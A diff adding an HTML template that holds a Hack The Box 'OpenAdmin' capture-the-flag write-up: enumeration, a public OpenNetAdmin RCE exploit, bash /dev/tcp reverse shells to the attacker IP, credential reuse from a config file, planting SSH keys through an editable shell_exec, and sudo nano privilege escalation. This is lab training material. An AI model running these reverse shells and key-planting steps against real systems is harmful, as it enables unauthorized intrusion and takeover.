@@ -1,0 +1,378 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB OpenAdmin</h1>
+    <p class="text">Difficulty Easy | UserDifficulty : 4.3</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">HTTP is open on the target machine.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/1-home.png' %}" alt="">
+    <p class="text">It's ubuntu apache default page, and there is no interesting information. So, I will enumerate directories with gobuster.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.107.59/ -t 70</u>
+/.htpasswd            (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/artwork              (Status: 301) [Size: 316] [--&gt; http://10.129.107.59/artwork/]
+/index.html           (Status: 200) [Size: 10918]
+/music                (Status: 301) [Size: 314] [--&gt; http://10.129.107.59/music/]
+/server-status        (Status: 403) [Size: 278]</code></pre></div>
+
+
+<p class="text">There are two interesting directories named music and artwork. Let's observe what's there manually.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/2-artwork.png' %}" alt="">
+    <p class="text">It looks like basic website where introduct some products. Let's enumerate this page first.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$  <u>gobsuter dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.107.59/artwork/ -t 70</u>
+===============================================================
+/.htpasswd            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/css                  (Status: 301) [Size: 320] [--&gt; http://10.129.107.59/artwork/css/]
+/fonts                (Status: 301) [Size: 322] [--&gt; http://10.129.107.59/artwork/fonts/]
+/images               (Status: 301) [Size: 323] [--&gt; http://10.129.107.59/artwork/images/]
+/index.html           (Status: 200) [Size: 14461]
+/js                   (Status: 301) [Size: 319] [--&gt; http://10.129.107.59/artwork/js/]</code></pre></div>
+
+<p class="text">It returned index.html, but no juicy information. All other dirs are js, css, images, and fonts which don't include critical information.</p>
+<p class="text">Therefore, I'll move on to /music directory.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/3-music.png' %}" alt="">
+    <p class="text">There is login page on the top right. It may reveal important information, so, let's see what's there.</p>
+</div>
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/4-ona.png' %}" alt="">
+    <p class="text">Pressing login button navigated me to new directory <u>ona</u>, which is admin software seemilgly. Fortunately, this page holds version information.</p>
+</div>
+
+<p class="text">QUick google reseach with keyword 'ona v18.1.1' returned this <a href="https://github.com/amriunix/ona-rce">poc</a>. We might be able to use this for reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ git clone https://github.com/amriunix/ona-rce
+└─$ python3 ona-rce.py exploit http://10.129.107.59/ona/
+[*] OpenNetAdmin 18.1.1 - Remote Code Execution
+[+] Connecting !
+[+] Connected Successfully!
+sh$ id 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh$ </code></pre></div>
+
+<p class="text">We got www-data user.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+
+<p class="text">Because generated shell seems to be unstable, I will generate new reverse shell first.</p>
+
+<div class="code-box"><pre><code>sh$ bash -c "bash -i >& /dev/tcp/10.10.16.40/4444 0>&1"
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.107.59] 39768
+bash: cannot set terminal process group (1298): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@openadmin:/opt/ona/www$ </code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.107.59] 39768
+bash: cannot set terminal process group (1298): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@openadmin:/opt/ona/www$ <u>script /dev/null -c /bin/bash</u>
+
+script /dev/null -c /bin/bash
+Script started, file is /dev/null
+
+www-data@openadmin:/opt/ona/www$ <u>^Z</u>
+zsh: suspended  nc -lvnp 4444
+                                                                
+┌──(kali㉿kali)-[~/tempo/ona-rce]
+└─$ stty raw -echo ;fg                                         
+[1]  + continued  nc -lvnp 4444
+                               <u>reset</u>
+reset: unknown terminal type unknown
+Terminal type? <u>screen</u>
+
+www-data@openadmin:/opt/ona/www$ ls
+config           images     local       modules  workspace_plugins
+config_dnld.php  include    login.php   plugins
+dcm.php          index.php  logout.php  winc
+www-data@openadmin:/opt/ona/www$ </code></pre></div>
+
+<p class="text">While browsing www directories, I found interesting file on <u>/opt/ona/www/local/config$</u>.</p>
+
+<div class="code-box"><pre><code>/www/local/config$ cat database_settings.inc.php | grep db                  
+        'db_type' =&gt;'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,</code></pre></div>
+
+        <p class="text">On the file <u>database_settings.inc.php</u> file, I found mysql credentials. Let's see mysql database with this credential.</p>
+<div class="code-box"><pre><code>www-data@openadmin:/opt/ona/www/local/config$ <u>mysql -u ona_sys -p</u>
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 63
+Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)
+
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> </code></pre></div>
+
+<div class="code-box"><code><pre>mysql> <u>show databases;</u>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ona_default        |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use ona_default
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> <u>show tables;</u>
++------------------------+
+| Tables_in_ona_default  |
++------------------------+
+| blocks                 |
+| configuration_types    |
+| configurations         |
+| custom_attribute_types |
+| custom_attributes      |
+| dcm_module_list        |
+| device_types           |
+| devices                |
+| dhcp_failover_groups   |
+| dhcp_option_entries    |
+| dhcp_options           |
+| dhcp_pools             |
+| dhcp_server_subnets    |
+| dns                    |
+| dns_server_domains     |
+| dns_views              |
+| domains                |
+| group_assignments      |
+| groups                 |
+| host_roles             |
+| hosts                  |
+| interface_clusters     |
+| interfaces             |
+| locations              |
+| manufacturers          |
+| messages               |
+| models                 |
+| ona_logs               |
+| permission_assignments |
+| permissions            |
+| roles                  |
+| sequences              |
+| sessions               |
+| subnet_types           |
+| subnets                |
+| sys_config             |
+| tags                   |
+| users                  |
+| vlan_campuses          |
+| vlans                  |
++------------------------+
+40 rows in set (0.00 sec)
+
+mysql> <u>select * from users;</u>
++----+----------+----------------------------------+-------+---------------------+---------------------+
+| id | username | password                         | level | ctime               | atime               |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2025-10-14 11:06:27 | 2025-10-14 11:06:27 |
+|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2025-10-14 08:01:05 | 2025-10-14 08:01:05 |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+2 rows in set (0.00 sec)
+</pre></code></div>
+
+<p class="text">We got md-5 password hash. Let's crack this.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/5-crack.png' %}" alt="">
+    <p class="text">However, crackstation returned simple word 'admin', and it should not be other user's password. Though I saw other tables' information, there were no interesting information. </p>
+</div>
+
+<p class="text">Though the password is stored as database credentials, it doesn't mean we cannot use it for user login password. Let's try to login to other user with password <u>'n1nj4W4rri0R!'</u>.</p>
+
+<div class="code-box"><pre><code>www-data@openadmin:/opt/ona/www/local/config$ ls /home
+jimmy  joanna
+www-data@openadmin:/opt/ona/www/local/config$ su jimmy
+Password: 
+jimmy@openadmin:/opt/ona/www/local/config$ </code></pre></div>
+
+<p class="text">It's annoying, but I could change user successfuly.</p>
+
+
+<h2 class="sutbtitle">Lateral Movement 2</h2>
+
+<p class="text">Before enumeration, I reccomend you to establish ssh connection.</p>
+<p class="text">Generate public ssh file with <u>ssh-keygen</u>, and ...</p>
+
+<div class="code-box"><pre><code>└─$ <u>cat ~/.ssh/xxxxx_xxxxx.pub</u>
+xxx-xxxxx AAAAC3NzaC1lZDI1NT.....TDuTQCIZz1Cp kali@kali <u class="green">#Copy this output to your clipboard.</u>
+jimmy@openadmin:/opt/ona/www/local/config$ <u>echo 'xxx-xxxxx AAAAC3NzaC1lZDI1NT.....TDuTQCIZz1Cp kali@kali ' > ~/.ssh/authorized_keys</u></code></pre></div>
+
+
+<p class="text">Then, we can establish ssh conneciton with jimmy.</p>
+
+<div class="code-box"><pre><code>└─$ ssh -i ~/.ssh/id_ed25519 jimmy@openadmin.htb
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Oct 14 11:20:52 UTC 2025
+
+  System load:  0.0               Processes:             199
+  Usage of /:   31.0% of 7.81GB   Users logged in:       1
+  Memory usage: 15%               IP address for ens160: 10.129.107.59
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+39 packages can be updated.
+11 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Oct 14 08:08:37 2025 from 10.10.16.40
+jimmy@openadmin:~$ </code></pre></div>
+
+<p class="text">Then, let's search the way to accomplish second lateral movement.</p>
+
+
+<div class="code-box"><pre><code>jimmy@openadmin:~$ <u>netstat -tulnp</u>
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*   </code></pre></div>
+
+<p class="text">There is a local-hosting on a port 52846. I will do port forwarding with ssh.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u> ssh -i ~/.ssh/id_ed25519 -L 52846:127.0.0.1:52846 jimmy@openadmin.htb</u></code></pre></div>
+
+<p class="text">Then, see what's going on there.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/6-pf.png' %}" alt="">
+    <p class="text">Opening the port <u>http://127.0.0.1:52846</u> shows me login form. However, I cannot open this site with credential I used before.</p>
+</div>
+
+<div class="code-box"><pre><code>            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
+              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
+                  $_SESSION['username'] = 'jimmy';</code></pre></div>
+
+                  <p class="text">On the directory /var/www/internal/index.php, I found hashed password. Cracking with crackstation returned password <u>Revealed</u>.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/7-hash.png' %}" alt="">
+    <p class="text">After login, The page redirected to the page where displays encrypted hash. We might have to decode this.</p>
+</div>
+
+<p class="text">However, I realized that I don't have to decode hashed id_rsa because of this source code for this page below.</p>
+
+<div class="code-box"><pre><code>&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = <u>shell_exec('cat ~/.ssh/id_rsa')</u>
+echo "<pre>$output</pre>";
+?>
+&lt;html>
+&lt;h3>Don't forget your "ninja" password&lt;/h3>
+Click here to logout &lt;a href="logout.php" tite = "Logout">Session
+</html>
+</code></pre></div>
+
+<p class="text">Because we have write privilege for this file, we can replace arbitrary code inside the <u>shell_exec(...)</u>. I will change the code into <u>echo 'my_public ssh file' >> /home/joanna/.ssh/authorized_keys</u>, and reload this page.</p>
+
+<p class="text">Then, try to establish connection with joanna.</p>
+
+<div class="code-box"><pre><code>└─$ <u>ssh -i ~/.ssh/my_key joanna@openadmin.htb</u>
+.....
+joanna@openadmin:~$</code></pre></div>
+
+<p class="text">We got user joanna.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">PrivEsc was easier than I thought.</p>
+<div class="code-box"><pre><code>/bin\:/sbin\:/bin,
+    mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv</code></pre></div>
+
+<p class="text">We have sudo right for nano. </p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/openadmin/8-bin.png' %}" alt="">
+    <p class="text">Searching PrivEsc vector in <a href="https://gtfobins.github.io/">GTFOBins</a>, I found this instruction.</p>
+</div>
+
+<p class="text">We can execute arbitrary code with this method. I will send reverse shell with the code <u>bash -c 'bash -i >& /dev/tcp/10.10.16.40/4444 0>&1'</u>.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.107.59] 38008
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">We've got root shell. You can find root flag in /root/root.txt</p>
+
+</body>
+</html>
